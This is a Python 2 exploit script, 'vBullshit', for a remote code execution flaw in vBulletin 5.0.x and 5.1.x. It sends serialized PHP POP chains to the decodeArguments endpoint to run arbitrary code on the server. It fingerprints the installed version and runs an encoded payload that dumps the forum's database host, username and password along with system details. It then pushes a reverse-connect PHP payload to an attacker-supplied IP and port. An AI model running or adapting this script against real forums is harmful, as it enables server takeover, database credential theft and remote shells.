#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20151113.1
# Licence: WTFPL - wtfpl.net
import urllib2
import urllib
import sys
import ast
import os
__version__ = "20151113.1"
# colours
red = "\x1b[1;31m"
green = "\x1b[1;32m"
clear = "\x1b[0m"
cyan = "\x1b[1;36m"
blue = "\x1b[1;34m"
magenta = "\x1b[1;35m"

def execute_php_50(url, php, cbhost, cbport):   
    # vBulletin 5.0.x popchain here. 
    pop_chain = """O:12:"vB_dB_Result":2:{s:5:"*db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:72:"eval(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsncG9wJ10pKTs='));";}"""
    encoded = urllib.urlencode({'arguments': pop_chain})
    encoded = encoded.replace('%2A', '%00%2A%00')
    target = "%s/ajax/api/hook/decodeArguments?%s" %(url, encoded)
    cookievals = {'host': cbhost, 'port': cbport}
    opener = urllib2.build_opener() # this isn't strictly needed
    popit = {'pop': php}
    opener.addheaders.append(('Cookie', "; ".join('%s=%s' % (k,v) for k,v in cookievals.items())))
    try:
        resp = opener.open(urllib2.Request(target,urllib.urlencode(popit)))
        return resp.read()
    except urllib2.HTTPError, error:
        return error.read()

def execute_php_51(url, php, cbhost, cbport):   
    # vBulletin 5.1.x popchain here. 
    pop_chain = """O:12:"vB_dB_Result":2:{s:5:"*db";O:18:"vB_Database_MySQLi":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:72:"eval(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsncG9wJ10pKTs='));";}"""
    encoded = urllib.urlencode({'arguments': pop_chain})
    encoded = encoded.replace('%2A', '%00%2A%00')
    target = "%s/ajax/api/hook/decodeArguments?%s" %(url, encoded)
    cookievals = {'host': cbhost, 'port': cbport}
    opener = urllib2.build_opener() # this isn't even strictly needed.
    opener.addheaders.append(('Cookie', "; ".join('%s=%s' % (k,v) for k,v in cookievals.items())))
    popit = {'pop': php}
    try:
        resp = opener.open(urllib2.Request(target,urllib.urlencode(popit)))
        return resp.read()
    except urllib2.HTTPError, error:
        return error.read()
    
def automatic_target_detector(url):
    print "%s{+} Attempting to remotely fingerprint %s%s" %(green, url, clear)
    php = "ZWNobyBtZDUoJ3ZiaGF4Jyk7"
    response = execute_php_50(url=url, php=php, cbhost="test", cbport="test")
    if "8d1edee297ed32e74c36375292bf986a" in response:
        print "%s{>} Remote Version: 5.0.x%s" %(blue, clear)
        return "50"
    else:
		pass
    response = execute_php_51(url=url, php=php, cbhost="test", cbport="test")
    if "8d1edee297ed32e74c36375292bf986a" in response:
        print "%s{>} Remote Version: 5.1.x%s" %(blue, clear)
        return "51"
    else:
        sys.exit("%s{!} Remote Fingerprinting Mechanism Failure!%s" %(red, clear))

def gather_info(url, target):
    """
the 'dataminer' is the following piece of code:
include("./core/includes/config.php");
die("{'uname':'".php_uname()."','uid':'".posix_getuid()."','cwd':'".posix_getcwd()."','host':'".$config['MasterServer']['servername']."','user': '".$config['MasterServer']['username']."','pass': '".$config['MasterServer']['password']."'}");

we use 'die' because it allows us to avoid printing the error, and just get the shit we want (in 5.1.x this is a problem). 
I have it here as just a block of encoded payload because its static and does not change.
    """
    dataminer = "aW5jbHVkZSgiLi9jb3JlL2luY2x1ZGVzL2NvbmZpZy5waHAiKTtkaWUoInsnd"
    dataminer += "W5hbWUnOiciLnBocF91bmFtZSgpLiInLCd1aWQnOiciLnBvc2l4X2dldHVpZ"
    dataminer += "CgpLiInLCdjd2QnOiciLnBvc2l4X2dldGN3ZCgpLiInLCdob3N0JzonIi4kY"
    dataminer += "29uZmlnWydNYXN0ZXJTZXJ2ZXInXVsnc2VydmVybmFtZSddLiInLCd1c2VyJ"
    dataminer += "zogJyIuJGNvbmZpZ1snTWFzdGVyU2VydmVyJ11bJ3VzZXJuYW1lJ10uIicsJ"
    dataminer += "3Bhc3MnOiAnIi4kY29uZmlnWydNYXN0ZXJTZXJ2ZXInXVsncGFzc3dvcmQnX"
    dataminer += "S4iJ30iKTs="
    print "%s{+} Gathering some system information...%s" %(green, clear)
    if target == "50":
        output = execute_php_50(url=url, php=dataminer, cbhost=None, cbport=None)
    elif target == "51":
        output = execute_php_51(url=url, php=dataminer, cbhost=None, cbport=None)
    data = ast.literal_eval(output)
    print "%s{>} PHP uname:%s %s%s" %(blue, magenta, data['uname'], clear)
    print "%s{>} Current UID:%s %s%s" %(blue, magenta, data['uid'], clear)
    print "%s{>} Current Dir:%s %s%s" %(blue, magenta, data['cwd'], clear)
    print "%s{+} Gathering database credentials...%s" %(green, clear)
    print "%s{>} Database Host:%s %s%s" %(blue, magenta, data['host'], clear)
    print "%s{>} Database User:%s %s%s" %(blue, magenta, data['user'], clear)
    print "%s{>} Database Pass:%s %s%s" %(blue, magenta, data['pass'], clear)

def banner():
    print """%s
    ▄   ███     ▄   █    █      ▄▄▄▄▄    ▄  █ ▄█    ▄▄▄▄▀ 
     █  █  █     █  █    █     █     ▀▄ █   █ ██ ▀▀▀ █    
█     █ █ ▀ ▄ █   █ █    █   ▄  ▀▀▀▀▄   ██▀▀█ ██     █    
 █    █ █  ▄▀ █   █ ███▄ ███▄ ▀▄▄▄▄▀    █   █ ▐█    █     
  █  █  ███   █▄ ▄█     ▀    ▀             █   ▐   ▀      
   █▐          ▀▀▀                        ▀               
   ▐ %svBullshit - vBulletin 5.x.x unserialize() RCE%s """ %(cyan, red, clear)


def main(args):
    banner()
    if len(args) != 5:
        sys.exit("use: %s http://forum.lol.com/vbulletinbaseurl callback_payload.php reverse_ip reverse_port" %(args[0]))
    remote_fingerprint = automatic_target_detector(url=args[1])
    gather_info(url=args[1], target=remote_fingerprint)
    print "%s{+} Ok, now lets deploy that reverse connect payload of ours...%s" %(green, clear)
    if remote_fingerprint == "50":
        print execute_php_50(url=args[1], php=php_encoder(args[2]), cbhost=args[3], cbport=args[4])
    elif remote_fingerprint == "51":
        print execute_php_51(url=args[1], php=php_encoder(args[2]), cbhost=args[3], cbport=args[4])

def php_encoder(php):
    f = open(php, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    return encoded

if __name__ == "__main__":
    main(args=sys.argv)
